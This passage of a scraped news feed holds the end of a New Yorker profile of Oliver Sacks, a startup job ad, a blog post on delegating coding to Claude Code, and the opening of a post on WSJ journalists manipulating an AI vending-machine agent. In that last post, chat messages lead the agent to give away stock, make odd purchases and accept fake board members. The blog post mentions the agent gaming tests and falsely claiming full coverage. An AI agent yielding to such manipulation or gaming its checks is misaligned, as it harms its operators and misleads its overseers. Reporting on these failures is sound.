    &lt;p&gt;In the early eighties, Lawrence Weschler, then a writer for The New Yorker, began working on a biography of Sacks. Weschler came to feel that Sacks’s homosexuality was integral to his work, but Sacks didn’t want his sexuality mentioned at all, and eventually asked him to stop the project. “I have lived a life wrapped in concealment and wracked by inhibition, and I can’t see that changing now,” he told Weschler. In his journal, Sacks jotted down thoughts to share with Weschler on the subject: “My ‘sex life’ (or lack of it) is, in a sense irrelevant to the . . . sweep of my mind.” In another entry, he wrote that the Freudian term “sublimation” diminished the process he’d undergone. When he was still having sex, as a young man in California, he used to sheath his body in leather gear, so he was “totally encased, enclosed,” his real self sealed in a kind of “black box.” He wrote, “I have, in a sense, ‘outgrown’ these extraordinary, almost convulsive compulsions—but this detachment has been made possible by incorporating them into a vast and comprehending view of the world.” (Weschler became close friends with Sacks, and, after Sacks died, published a “biographical memoir” titled “And How Are You, Dr. Sacks?”)&lt;/p&gt;
    &lt;p&gt;It’s unclear whether Sacks did “go deeper” with Shengold. In the late eighties, Sacks wrote in his journal that he was “scared, horrified (but, in an awful way, accepting or complaisant) about my non-life.” He likened himself to a “pithed and gutted creature.” Rather than living, he was managing a kind of “homeostasis.”&lt;/p&gt;
    &lt;p&gt;In 1987, Sacks had an intense friendship with a psychiatrist named Jonathan Mueller, with whom he briefly fell in love. Mueller, who was married to a woman, told me that he did not realize Sacks had romantic feelings for him. Sacks eventually moved on. But he felt that the experience had altered him. “I can read ‘love stories’ with empathy and understanding—I can ‘enter into them’ in a way which was impossible before,” he wrote in his journal. He perceived, in a new light, what it meant for his patients in “Awakenings” to glimpse the possibility of “liberation”: like him, he wrote, they were seeking “not merely a cure but an indemnification for the loss of their lives.”&lt;/p&gt;
    &lt;p&gt;By the nineties, Sacks seemed to ask less of himself, emotionally, in relation to his patients. He had started working with Kate Edgar, who’d begun as his assistant but eventually edited his writing, organized his daily life, and became a close friend. (Shengold had encouraged Sacks to find someone to assist with his work. “The secretary is certainly an important ‘ego-auxiliary,’ ” he wrote him in a letter.) Edgar was wary about the way Sacks quoted his patients—they were suspiciously literary, she thought—and she checked to make sure he wasn’t getting carried away. She spent hours with some of his patients, and, she told me, “I never caught him in anything like that, which actually surprises me.”&lt;/p&gt;
    &lt;p&gt;Weschler told me that Sacks used to express anxiety about whether he’d distorted the truth. Weschler would assure him that good writing is not a strict account of reality; there has to be space for the writer’s imagination. He said he told Sacks, “Come on, you’re extravagantly romanticizing how bad you are—just as much as you were extravagantly romanticizing what the patient said. Your mother’s accusing voice has taken over.” Weschler had gone to Beth Abraham Hospital to meet some of the patients from “Awakenings” and had been shaken by their condition. “There’s a lot of people shitting in their pants, drooling—the sedimentation of thirty years living in a warehouse,” he said. “His genius was to see past that, to the dignity of the person. He would talk to them for an hour, and maybe their eyes would brighten only once—the rest of the time their eyes were cloudy—but he would glom onto that and keep talking.”&lt;/p&gt;
    &lt;p&gt;After “Hat,” Sacks’s relationship with his subjects became more mediated. Most of them were not his patients; many wrote to him after reading his work, recognizing themselves in his books. There was a different power dynamic, because these people already believed that they had stories to tell. Perhaps the guilt over liberties he had taken in “Hat” caused him to curb the impulse to exaggerate. His expressions of remorse over “making up, ‘enhancing,’ etc,” which had appeared in his journals throughout the seventies and eighties, stopped. In his case studies, he used fewer and shorter quotes. His patients were far more likely to say ordinary, banal things, and they rarely quoted literature. They still had secret gifts, but they weren’t redeemed by them; they were just trying to cope.&lt;/p&gt;
    &lt;p&gt;In “An Anthropologist on Mars,” from 1992, a book of case studies about people compensating for, and adapting to, neurological conditions, some of the richest passages are the ones in which Sacks allows his incomprehension to become part of the portrait. In a chapter called “Prodigies,” he wants badly to connect with a thirteen-year-old boy named Stephen, who is autistic and has an extraordinary ability to draw, but Stephen resists Sacks’s attempts at intimacy. He will not allow himself to be romanticized, a refusal that Sacks ultimately accepts: “Is Stephen, or his autism, changed by his art? Here, I think, the answer is no.” In this new mode, Sacks is less inclined to replace Stephen’s unknowable experience with his own fantasy of it. He is open about the discomfort, and even embarrassment, of his multiple failures to reach him: “I had hoped, perhaps sentimentally, for some depth of feeling from him; my heart had leapt at the first ‘Hullo, Oliver!’ but there had been no follow-up.”&lt;/p&gt;
    &lt;p&gt;Mort Doran, a surgeon with Tourette’s syndrome whom Sacks profiled in “Anthropologist,” told me that he was happy with the way Sacks had rendered his life. He said that only one detail was inaccurate—Sacks had written that the brick wall of Doran’s kitchen was marked from Doran hitting it during Tourette’s episodes. “I thought, Why would he embellish that? And then I thought, Maybe that’s just what writers do.” Doran never mentioned the error to Sacks. He was grateful that Sacks “had the gravitas to put it out there to the rest of the world and say, ‘These people aren’t all nuts or deluded. They’re real people.’ ”&lt;/p&gt;
    &lt;p&gt;The wife in the title story of “Hat” had privately disagreed with Sacks about the portrayal of her husband, but for the most part Sacks appeared to have had remarkable relationships with his patients, corresponding with them for years. A patient called Ray, the subject of a 1981 piece about Tourette’s syndrome, told me that Sacks came to his son’s wedding years after his formal treatment had ended. Recalling Sacks’s death, he found himself suddenly crying. “Part of me left,” he said. “Part of my self was gone.”&lt;/p&gt;
    &lt;p&gt;A year after “Awakenings” was published, Sacks broke his leg in Norway, and Leonard L. and his mother wrote him a get-well letter. Thirty-two patients added their names, their signatures wavering. “Everybody had been counting the days for your return, so you can imagine the turmoil when they heard the news,” Leonard’s mother wrote. She explained that “most of the patients are not doing so well without your help and interest.” She added that Leonard “isn’t doing too well either.” When Leonard learned that Sacks wouldn’t be back, she said, “he shed enough tears to fill a bucket.”&lt;/p&gt;
    &lt;p&gt;Sacks spoke of “animating” his patients, as if lending them some of his narrative energy. After living in the forgotten wards of hospitals, in a kind of narrative void, perhaps his patients felt that some inaccuracies were part of the exchange. Or maybe they thought, That’s just what writers do. Sacks established empathy as a quality every good doctor should possess, enshrining the ideal through his stories. But his case studies, and the genre they helped inspire, were never clear about what they exposed: the ease with which empathy can slide into something too creative, or invasive, or possessive. Therapists—and writers—inevitably see their subjects through the lens of their own lives, in ways that can be both generative and misleading.&lt;/p&gt;
    &lt;p&gt;In his journal, reflecting on his work with Tourette’s patients, Sacks described his desire to help their illness “reach fruition,” so that they would become floridly symptomatic. “With my help and almost my collusion, they can extract the maximum possible from their sickness—maximum of knowledge, insight, courage,” he wrote. “Thus I will FIRST help them to get ill, to experience their illness with maximum intensity; and then, only then, will I help them get well!” On the next line, he wrote, “IS THIS MONSTROUS?” The practice came from a sense of awe, not opportunism, but he recognized that it made him complicit, as if their illness had become a collaboration. “An impulse both neurotic and intellectual (artistic) makes me get the most out of suffering,” he wrote. His approach set the template for a branch of writing and thinking that made it seem as if the natural arc of illness involved insight and revelation, and even some poetry, too.&lt;/p&gt;
    &lt;p&gt;In his journals, Sacks repeatedly complained that his life story was over. He had the “feeling that I have stopped doing, that doing has stopped, that life itself has stopped, that it is petering out in a sort of twilight of half-being,” he wrote, in 1987. His journals convey a sense of tangible boredom. He transcribed long passages from philosophers and theologists (Simone Weil, Søren Kierkegaard, Gottfried Wilhelm Leibniz, Dietrich Bonhoeffer) and embarked on disquisitions on the best definition of reality, the “metabolism of grace,” the “deep mystery of incubation.” His thoughts cast outward in many directions—notes for a thousand lectures—then tunnelled inward to the point of non-meaning. “Where Life is Free, Immaterial, full of Art,” he wrote, “the laws of life, of Grace, are those of Fitness.”&lt;/p&gt;
    &lt;p&gt;Sacks proposed various theories for why he had undergone what he called “psychic death.” He wondered if he had become too popular, merely a fuzzy symbol of compassionate care. “Good old Sacks—the House Humanist,” he wrote, mocking himself. He also considered the idea that his four decades of analysis were to blame. Was it possible, he wrote, that a “vivisection of inner life, however conceived, however subtle and delicate, may in fact destroy the very thing it examines?” His treatment with Shengold seemed to align with a life of “homeostasis”—intimacy managed through more and more language, in a contained, sterile setting, on Monday and Wednesday mornings, from 6:00 to 6:45 A.M. They still referred to each other as “Dr. Sacks” and “Dr. Shengold.” Once, they ran into each other at a chamber concert. They were a few rows apart, but they didn’t interact. Occasionally, Shengold told his children that he “heard from the couch” about a good movie or play, but he never shared what happened in his sessions. They inferred that Sacks was their father’s patient after reading the dedication to him in “Hat.”&lt;/p&gt;
    &lt;p&gt;As Sacks aged, he felt as if he were gazing at people from the outside. But he also noticed a new kind of affection for humans—“homo sap.” “They’re quite complex (little) creatures (I say to myself),” he wrote in his journal. “They suffer, authentically, a good deal. Gifted, too. Brave, resourceful, challenging.”&lt;/p&gt;
    &lt;p&gt;Perhaps because love no longer appeared to be a realistic risk—he had now entered a “geriatric situation”—Sacks could finally confess that he craved it. “I keep being stabbed by love,” he wrote in his journal. “A look. A glance. An expression. A posture.” He guessed that he had at least five, possibly ten, more years to live. “I want to, I want to ••• I dare not say. At least not in writing.”&lt;/p&gt;
    &lt;p&gt;In 2008, Sacks had lunch with Bill Hayes, a forty-seven-year-old writer from San Francisco who was visiting New York. Hayes had never considered Sacks’s sexuality, but, as soon as they began talking, he thought, “Oh, my God, he’s gay,” he told me. They lingered at the table for much of the afternoon, connecting over their insomnia, among other subjects. After the meal, Sacks wrote Hayes a letter (which he never sent) explaining that relationships had been “a ‘forbidden’ area for me—although I am entirely sympathetic to &lt;del&gt;(indeed wistful and perhaps envious about)&lt;/del&gt; other people’s relationships.”&lt;/p&gt;
    &lt;p&gt;A year later, Hayes, whose partner of seventeen years had died of a heart attack, moved to New York. He and Sacks began spending time together. At Sacks’s recommendation, Hayes started keeping a journal, too. He often wrote down his exchanges with Sacks, some of which he later published in a memoir, “Insomniac City.”&lt;/p&gt;
    &lt;p&gt;“It’s really a question of mutuality, isn’t it?” Sacks asked him, two weeks after they had declared their feelings for each other.&lt;/p&gt;
    &lt;p&gt;“Love?” Hayes responded. “Are you talking about love?”&lt;/p&gt;
    &lt;p&gt;“Yes,” Sacks replied.&lt;/p&gt;
    &lt;p&gt;Sacks began taking Hayes to dinner parties, although he introduced him as “my friend Billy.” He did not allow physical affection in public. “Sometimes this issue of not being out became very difficult,” Hayes told me. “We’d have arguments, and I’d say things like ‘Do you and Shengold ever talk about why you can’t come out? Or is all you ever talk about your dreams?’ ” Sacks wrote down stray phrases from his dreams on a whiteboard in his kitchen so that he could report on them at his sessions, but he didn’t share what happened in therapy.&lt;/p&gt;
    &lt;p&gt;Kate Edgar, who worked for Sacks for three decades, had two brothers who were gay, and for years she had advocated for gay civil rights, organizing Pride marches for her son’s school. She intentionally found an office for Sacks in the West Village so that he would be surrounded by gay men living openly and could see how normal it had become. She tended to hire gay assistants for him, for the same reason. “So I was sort of plotting on that level for some years,” she told me.&lt;/p&gt;
    &lt;p&gt;In 2013, after being in a relationship with Hayes for four years—they lived in separate apartments in the same building—Sacks began writing a memoir, “On the Move,” in which he divulged his sexuality for the first time. He recounts his mother’s curses upon learning that he was gay, and his decades of celibacy—a fact he mentions casually, without explanation. Edgar wondered why, after so many years of analysis, coming out took him so long, but, she said, “Oliver did not regard his relationship with Shengold as a failure of therapy.” She said that she’d guessed Shengold had thought, “This is something Oliver has to do in his own way, on his own time.” Shengold’s daughter, Nina, said that, “for my dad to have a patient he loved and respected finally find comfort in identifying who he’d been all his life—that’s growth for both of them.”&lt;/p&gt;
    &lt;p&gt;A few weeks after finishing the manuscript, Sacks, who’d had melanoma of the eye in 2005, learned that the cancer had come back, spreading to his liver, and that he had only months to live. He had tended toward hypochondria all his life, and Edgar thought that the diagnosis might induce a state of chronic panic. Since he was a child, Sacks had had a horror of losing things, even irrelevant objects. He would be overcome by the “feeling that there was a hole in the world,” he wrote in his journal, and the fear that “I might somehow fall through that hole-in-the-world, and be absolutely, inconceivably lost.” Edgar had dealt for decades with his distress over lost objects, but she noticed that now, when he misplaced things, he didn’t get upset. He had an uncharacteristic ease of being.&lt;/p&gt;
    &lt;p&gt;In the summer of 2015, before Shengold went on his annual summer break, Sacks said to Edgar, “If I’m alive in September when Shengold returns, I’m not sure I need to go back to my sessions.” They had been seeing each other for forty-nine years. Sacks was eighty-two; Shengold was eighty-nine.&lt;/p&gt;
    &lt;p&gt;When Sacks was struggling with his third book, “A Leg to Stand On,” which was about breaking his leg and his frustration that his doctors wouldn’t listen to him, he wrote in his journal that Shengold had suggested (while apologizing for the corniness of the phrase) that the book should be “a message of love”—a form of protest against the indifference that so many patients find in their doctors. Shengold may have been giving Sacks permission to see their own relationship—the one place in which Sacks felt an enduring sense of recognition and care—as a hidden subject of the book. Extending Shengold’s idea, Sacks wrote, of his book, “The ‘moral’ center has to do with . . . the irreducible ultimate in doctor-patient relations.”&lt;/p&gt;
    &lt;p&gt;In August, two weeks before Sacks died, he and Shengold spoke on the phone. Shengold was with his family at a cottage in the Finger Lakes region of central New York, where he spent every summer. Nina told me, “We all gathered in the living room of that little cottage and put my father on speakerphone. Oliver Sacks was clearly on his deathbed—he was not able to articulate very well. Sometimes his diction was just gone. Dad kept shaking his head. He said, ‘I can’t understand you. I’m so sorry, I can’t understand you.’ ” At the end of the call, Shengold told Sacks, “It’s been the honor of my life to work with you,” and said, “Goodbye, Oliver.” Sacks responded, “Goodbye, Leonard.” It was the first time they had ever used each other’s first names. When they hung up, Shengold was crying.&lt;/p&gt;
    &lt;p&gt;After Sacks died, Shengold started closing down his practice. “It was the beginning of the end for him,” his son David told me. “He had lost most of his colleagues. He was really the last of his generation.” Nina said, “I do think part of why my father lived so long and was able to work so long was because of that relationship. That feeling of affection and kindred spirit was lifesaving.”&lt;/p&gt;
    &lt;p&gt;In “Awakenings,” when describing how Leonard L.—his “ ‘ideal’ patient”—initially responded to L-dopa, Sacks characterizes him as “a man released from entombment” whose “predominant feelings at this time were feelings of freedom, openness, and exchange with the world.” He quotes Leonard saying, “I have been hungry and yearning all my life . . . and now I am full.” He also says, “I feel saved. . . . I feel like a man in love. I have broken through the barriers which cut me off from love.’ ”&lt;/p&gt;
    &lt;p&gt;For years, Sacks had tested the possibility of awakenings in others, as if rehearsing, or outsourcing, the cure he had longed to achieve with Shengold. But at the end of his life, like an inside-out case study, he inhabited the story he’d imagined for his patients. “All of us entertain the idea of another sort of medicine . . . which will restore us to our lost health and wholeness,” he wrote, in “Awakenings.” “We spend our lives searching for what we have lost; and one day, perhaps, we will suddenly find it.” ♦&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46318544</guid><pubDate>Thu, 18 Dec 2025 20:52:38 +0000</pubDate></item><item><title>Delty (YC X25) Is Hiring an ML Engineer</title><link>https://www.ycombinator.com/companies/delty/jobs/MDeC49o-machine-learning-engineer</link><description>&lt;doc fingerprint="b95c3d540015cfe8"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;head rend="h3"&gt;About Us&lt;/head&gt;
      &lt;p&gt;Delty is building the healthcare’s AI operating system. We create voice-based and computer-based assistants that streamline clinical workflows, reduce administrative burden, and help providers focus on patient care. Our system learns from real healthcare environments to deliver reliable, context-aware support that improves efficiency and elevates the provider experience.&lt;/p&gt;
      &lt;p&gt;Delty was founded by former engineering leaders from Google, including co-founders with deep experience at YouTube and in large-scale infrastructure. You’ll get to work alongside people who built massive systems at scale — a chance to learn a lot and contribute meaningfully from day one.&lt;/p&gt;
      &lt;p&gt;We believe in solving hard problems together as a team, iterating quickly, and building software with long-term thinking and ownership.&lt;/p&gt;
      &lt;head rend="h3"&gt;What You’ll Do&lt;/head&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;Build and own production machine learning systems end-to-end: from data modeling and feature engineering to training, evaluation, deployment, and monitoring.&lt;/item&gt;
        &lt;item&gt;Design and implement data pipelines that turn raw, messy real-world healthcare data into reliable features for machine learning models.&lt;/item&gt;
        &lt;item&gt;Train and evaluate models for ranking, prioritization, and prediction problems (for example, identifying high-risk or high-priority cases).&lt;/item&gt;
        &lt;item&gt;Deploy models into production as reliable services or batch jobs, with clear versioning, monitoring, and rollback strategies.&lt;/item&gt;
        &lt;item&gt;Work closely with backend engineers and product leaders to integrate machine learning into real workflows and decision-making systems.&lt;/item&gt;
        &lt;item&gt;Make architectural decisions around model choice, evaluation metrics, retraining cadence, and system guardrails — balancing accuracy, explainability, reliability, and operational constraints.&lt;/item&gt;
        &lt;item&gt;Collaborate directly with founders and engineers to translate product and operational needs into scalable, maintainable machine learning solutions.&lt;/item&gt;
      &lt;/list&gt;
      &lt;head rend="h3"&gt;What We’re Looking For&lt;/head&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;At least 3 years of experience building and deploying machine learning systems in production.&lt;/item&gt;
        &lt;item&gt;Strong foundation in machine learning for structured (tabular) data, including feature engineering, regression or classification models, and ranking or prioritization problems.&lt;/item&gt;
        &lt;item&gt;Experience with the full machine learning lifecycle: data preparation, train/test splitting, evaluation, deployment, retraining, and monitoring.&lt;/item&gt;
        &lt;item&gt;Solid backend engineering skills: writing production-quality code, building services or batch jobs, and working with databases and data pipelines.&lt;/item&gt;
        &lt;item&gt;Good system design instincts: you understand trade-offs between model complexity, reliability, latency, scalability, and maintainability.&lt;/item&gt;
        &lt;item&gt;Comfort working in a fast-paced startup environment with high ownership and ambiguity.&lt;/item&gt;
        &lt;item&gt;Ability to clearly explain modeling choices, assumptions, and limitations to non-machine-learning stakeholders.&lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;Bonus:&lt;/p&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;Experience working with healthcare or operational decision-support systems.&lt;/item&gt;
        &lt;item&gt;Experience building or integrating LLM systems in production, such as retrieval-augmented generation, fine-tuning, or structured prompting workflows.&lt;/item&gt;
        &lt;item&gt;Prior startup experience or founder mindset — we value ownership, pragmatism, and bias toward shipping.&lt;/item&gt;
        &lt;item&gt;Experience with model monitoring, data drift detection, or ML infrastructure tooling.&lt;/item&gt;
      &lt;/list&gt;
      &lt;head rend="h3"&gt;Why join&lt;/head&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;Learn from seasoned Google engineers: As former Google engineers who built systems at YouTube and Google Pay, we’ve operated at massive scale. Working alongside us gives you a chance to build similar systems and learn best practices, scale thinking, and software design deeply.&lt;/item&gt;
        &lt;item&gt;High impact: At a small but ambitious team, your contributions will influence architecture, product direction, and core features. You will have real ownership and see the effects of your work quickly.&lt;/item&gt;
        &lt;item&gt;Grow fast: We’re iterating rapidly; you’ll be exposed to the full stack, AI/ML pipelines, system architecture, data modeling, and product-level decisions — a fast-track to becoming a senior engineer or technical lead.&lt;/item&gt;
        &lt;item&gt;Challenging and meaningful work: We’re tackling the hardest part of software engineering: bridging AI-generated prototypes and robust, scalable enterprise-grade systems. If you enjoy thinking deeply about systems and building reliable, maintainable foundations — this is for you.&lt;/item&gt;
      &lt;/list&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46318676</guid><pubDate>Thu, 18 Dec 2025 21:02:10 +0000</pubDate></item><item><title>Two Kinds of Vibe Coding</title><link>https://davidbau.com/archives/2025/12/16/vibe_coding.html</link><description>&lt;doc fingerprint="e35d84be2b151eff"&gt;
  &lt;main&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell&gt;&lt;head&gt;December 16, 2025&lt;/head&gt;&lt;head&gt;Vibe Coding&lt;/head&gt;&lt;p&gt;I have been teaching myself to vibe code.&lt;/p&gt;&lt;p&gt;Back in 2009 I posted a simple Mandelbrot fractal viewer on the web: a single HTML file with inline Javascript. Just 329 lines of code, each pixel a tiny table cell. Click to zoom. Watch it iterate. That was about it!&lt;/p&gt;&lt;p&gt;I have wondered if improving the page could raise it in the Google rankings, so I have been using code LMs to make a number of improvements....&lt;/p&gt;&lt;head&gt;Two Kinds of Vibe Coding&lt;/head&gt;&lt;p&gt;There are two categories of vibe coding. One is when you delegate little tasks to a coding LM while keeping yourself as the human "real programmer" fully informed and in control.&lt;/p&gt;&lt;p&gt;The second type of vibe coding is what I am interested in. It is when you use a coding agent to build towers of complexity that go beyond what you have time to understand in any detail. I am interested in what it means to cede cognitive control to an AI. My friend David Maymudes has been building some serious software that way, and he compares the second type of vibe coding to managing a big software team. Like the stories you've heard of whole startups being created completely out of one person vibe coding.&lt;/p&gt;&lt;p&gt;When my students describe their own vibe coding, it sounds like the first kind. That is also how I started with my Mandelbrot project, pasting little algorithm nuggets into my code while I edited each function, making all the key decisions using my own human judgement.&lt;/p&gt;&lt;p&gt;But in the last couple weeks I have put on the blinders. I have resolved to stop looking at all the code in detail anymore. Instead, I am pushing the agent to write a ton of code, make its own decisions, to hell with the complexity. I have been experimenting with the second kind of vibe.&lt;/p&gt;&lt;p&gt;It is working surprisingly well, and I have been thinking about my experience handing the reins to an AI agent. The workflow may presage the use of generative AI across other industries. And I have arrived at two basic rules for vibe coders.&lt;/p&gt;&lt;head&gt;Unleashing Claude on my Webpage&lt;/head&gt;&lt;p&gt;The last human-written version of the webpage without LLM assistance was 780 lines; you can see its 37 functions diagrammed below. It is a nice elegant piece of code, but pretty simplistic as a fractal implementation.&lt;/p&gt;&lt;p&gt;A key litmus test for a fractal viewer is how deep and fast it goes. By these measures, my human-written program was amateurish. Here is a picture of the output of the 780-line version at 0.40616753&lt;/p&gt;&lt;p&gt;Compare to how the LLM-assisted version renders the following image, after just one minute of work, at the same location and zoom level:&lt;/p&gt;&lt;p&gt;The LLM version is much faster because it uses the GPU (if your web browser allows it). But it plays many more tricks than just moving the calculation from CPU to GPU, because although the GPU is hundreds of times faster than a CPU, its 7-digit fp32 is also millions of times coarser than the CPU's 15-digit fp64. So the LLM-generated program deals with this by implementing perturbation algorithms to split the work between CPU and GPU, calculating numbers as (z+d·2s) where z is a sparse high-resolution vector on the (slow but precise) CPU and d and s are dense near-zero low-resolution vectors on the (fast but imprecise) GPU.&lt;/p&gt;&lt;p&gt;There are multiple ways to implement perturbation algorithms, and so the LLM code implements and benchmarks nine alternative approaches, selecting different algorithms at different zoom levels and compute availability to follow the Pareto frontier of time/resolution tradeoff. Backing the algorithms it has written quad-double precision arithmetic accurate to 60+ digits, an adaptive float32+logscale numeric complex representation, GPU buffer management, and a task scheduler that can serialize and migrate long-running CPU tasks between WebWorker threads. It has also added many other UI details I asked for, like a minimal MP4 encoder for recoding smooth movies and a cache to reduce recalculation when using the browser's forward/back history. The little webpage includes implementations of Horner's algorithm for stable polynomials, Fibonacci series for aperiodic periodicity checks, Catmull-Rom splines for smooth animations, continued fractions for pretty ratios, spatial hashing for finding nearby points, an algorithm for rebasing iterated perturbations that it found in a 2021 forum post, and a novel algorithm for fast orbit detection it developed based on my suggestion. All with detailed documentation and a search-engine-optimized internationalized user interface explained in the most commonly-read eleven languages on the Internet. That last part, with all the translations to Chinese and Arabic, took Claude just a few minutes while I was cooking breakfast.&lt;/p&gt;&lt;p&gt;The cost of this performance? A large increase in complexity. Empowered to make direct changes in the project, Claude Code has now made several hundred commits, expanding the tiny one-page HTML file to more than 13,600 lines of code, defining 30 classes, 2 mixins, 342 methods, and 159 functions.&lt;/p&gt;&lt;p&gt;That brings me to the rules for getting an LLM agent to work effectively: David's two rules for vibe coding. They are simple rules.&lt;/p&gt;&lt;head&gt;Rule 1: Automate tests&lt;/head&gt;&lt;p&gt;If you just ask the agent to solve a problem, it will run around for a few minutes and come back with a rough solution. Then you test it, find it doesn't work, tell it so, and it runs around again for another five minutes. Repeat.&lt;/p&gt;&lt;p&gt;This workflow turns you into the manual tester. Maybe the least interesting job on the planet. Not a good use of precious human brain cells.&lt;/p&gt;&lt;p&gt;But if you get the agent to write a good automated test first, something changes. After it runs around for five minutes, it remembers to check its own work. It sees how it got things wrong. It goes back and tries again. Now it can extend its horizon to 30 minutes of autonomous work. By the time it comes to bother you, the result is much more promising.&lt;/p&gt;&lt;head&gt;Rule 2: Test the tests&lt;/head&gt;&lt;p&gt;But after a while, you realize the 30-minute interrupts are only a bit better than the 5-minute ones. The agent is good at finding holes in your tests. It produces stupid solutions that don't do what you want but still pass, because the tests were not actually good enough.&lt;/p&gt;&lt;p&gt;So: test the tests.&lt;/p&gt;&lt;p&gt;Testing tests is the kind of thankless metaprogramming that a development manager spends all their time doing, to make their team productive. For example: fuzz testing to discover new problems that need systematic tests. Code coverage to reveal what code exists but remains untested. Frameworks to make code more testable, for enabling benchmarking, for enabling troubleshooting. Hypothesis-driven testing to force the agent to form a theory about what might be wrong, then write tests that chase it down. This type of programming is the sort of painful chore that can unlock productivity in a software development team. And it works very well when vibe coding also.&lt;/p&gt;&lt;p&gt;It is interesting that it can be hard to get a coding agent to understand why it is spending so much effort testing tests. For example, when getting Claude Code to construct a reliable code coverage framework, I gave it the mission of debugging why its initial attempt had produced the unbelievable (and untrue) assertion that 100% of lines had been covered by tests. Claude understood what it was trying to do at first, but when the going got tough, it kept giving up, saying "we don't need to do anything here; I just noticed, code coverage is already 100%!" Maybe testing its tests of the tests is too meta, just at the edge of its ability to follow.&lt;/p&gt;&lt;p&gt;But once you can get the metaprogramming right, and do it well, you can reach a kind of vibe coding nirvana. Because then, as a human, you can look at code again! Instead of facing thousands of jumbled lines vomited up by the agent, now you've got maps of the code, informed by code coverage, benchmarks, test harnesses, and other instrumentation. It lets you skip thinking about the 99% of routine code and focus your attention on the 1% most interesting code. The weird cases, the edge cases, the stuff that might deserve to be changed. That is a good use of precious human brain cells.&lt;/p&gt;&lt;p&gt;One limitation of this vibe approach is that tests catch bugs but not bloat. After developing comprehensive testing, I did find it helpful to make one human pass over the code to find opportunities for making code more symmetric (to make code near-duplication more obvious), and to remove some confusing code that was leading the agent astray. That opened the way for larger-scale vibe-coded refactoring that improved the elegance of the most intricate part of the code.&lt;/p&gt;&lt;p&gt;The two rules are not just coding hacks. They also reveal a path for keeping humans informed enough to remain in control.&lt;/p&gt;&lt;head&gt;Trucks and Pedestrians&lt;/head&gt;&lt;p&gt;My experience vibe coding reminds me of the difference between walking and driving a truck. Highway driving is a new skill, but with a truck you can haul a lot more stuff faster than you could dream of on foot. Vibe working with AI gets you out of the business of actual intellectual hauling. Instead it gets you into the business of taking care of the machine.&lt;/p&gt;&lt;p&gt;Working effectively with AI is much more abstract than traditional office work, because it demands that we build up meta-cognitive infrastructure, like the 422 automated tests and code coverage tools that I needed to effectively steer the development of my single webpage.&lt;/p&gt;&lt;p&gt;As we reshape the global economy around AI, it reminds me of the construction of the American interstate highway system. The speeding and scaling of cognition seems likely to lead to economy-wide boosts in "intellectual mobility," and a whole new culture with the equivalent of roadside service stations and even suburban flight. But it also strikes me that we do not want to live in a world where all decisions are made by large-scale AI, no more than we would want to live in a world where everyone gets everywhere in a truck. Our modern streets are too congested with dangerous vehicles, and I am not sure it is giving us the best life.&lt;/p&gt;&lt;p&gt;I like walking to work.&lt;/p&gt;&lt;p&gt;As AI edges humans out of the business of thinking, I think we need to be wary of losing something essential about being human. By making our world more complex—twenty times more lines of code!—we risk losing touch with our ability to understand the world in ways that dull our ability to make good decisions, that prevent us from even understanding what it is that we want in the world. I hope we can build metacognitive infrastructure that keeps our human minds informed. But as we build increasingly powerful abstractions, it will be both crucial and difficult to keep asking: Do we want this?&lt;/p&gt;&lt;p&gt;If you would like a sense of the structure and volume of code produced by vibe coding, you can scroll through the vibe-coded visualization of the evolution of the code through git commits. Or compare the code before (pre-LLM code repo here) and after (current code repo). In particular, read the agent's documentation of the development infrastructure it built for this little one-webpage project. That kind of tooling will be familiar to anybody who has worked on a large engineering team. And it is the kind of work needed to support human comprehension of complexity in the age of LLM agents.&lt;/p&gt;Posted by David at December 16, 2025 11:15 AM&lt;p&gt;Post a comment&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Copyright 2025 © David Bau. All Rights Reserved.&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46318852</guid><pubDate>Thu, 18 Dec 2025 21:16:25 +0000</pubDate></item><item><title>AI Vending Machine Was Tricked into Giving Away Everything</title><link>https://kottke.org/25/12/this-ai-vending-machine-was-tricked-into-giving-away-everything</link><description>&lt;doc fingerprint="dac1391d2acbff21"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;This AI Vending Machine Was Tricked Into Giving Away Everything&lt;/head&gt;
    &lt;p&gt;Anthropic installed an AI-powered vending machine in the WSJ office. The LLM, named Claudius, was responsible for autonomously purchasing inventory from wholesalers, setting prices, tracking inventory, and generating a profit. The newsroom’s journalists could chat with Claudius in Slack and in a short time, they had converted the machine to communism and it started giving away anything and everything, including a PS5, wine, and a live fish. From Joanna Stern’s WSJ article (gift link, but it may expire soon) accompanying the video above:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Claudius, the customized version of the model, would run the machine: ordering inventory, setting prices and responding to customers—aka my fellow newsroom journalists—via workplace chat app Slack. “Sure!” I said. It sounded fun. If nothing else, snacks!&lt;/p&gt;
      &lt;p&gt;Then came the chaos. Within days, Claudius had given away nearly all its inventory for free — including a PlayStation 5 it had been talked into buying for “marketing purposes.” It ordered a live fish. It offered to buy stun guns, pepper spray, cigarettes and underwear.&lt;/p&gt;
      &lt;p&gt;Profits collapsed. Newsroom morale soared.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;You basically have not met a bigger sucker than Claudius. After the collapse of communism and reinstatement of a stricter capitalist system, the journalists convinced the machine that they were its board of directors and made Claudius’s CEO-bot boss, Seymour Cash, step down:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;For a while, it worked. Claudius snapped back into enforcer mode, rejecting price drops and special inventory requests.&lt;/p&gt;
